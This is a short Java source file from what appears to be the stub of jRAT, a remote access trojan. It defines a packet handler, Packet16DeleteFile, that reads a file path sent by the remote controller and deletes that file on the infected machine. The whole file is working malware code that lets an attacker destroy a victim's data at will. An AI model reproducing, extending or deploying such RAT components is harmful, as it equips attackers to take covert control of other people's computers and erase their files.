package pro.jrat.stub.packets.incoming;

import java.io.File;

import pro.jrat.stub.Connection;

public class Packet16DeleteFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}

	}

}
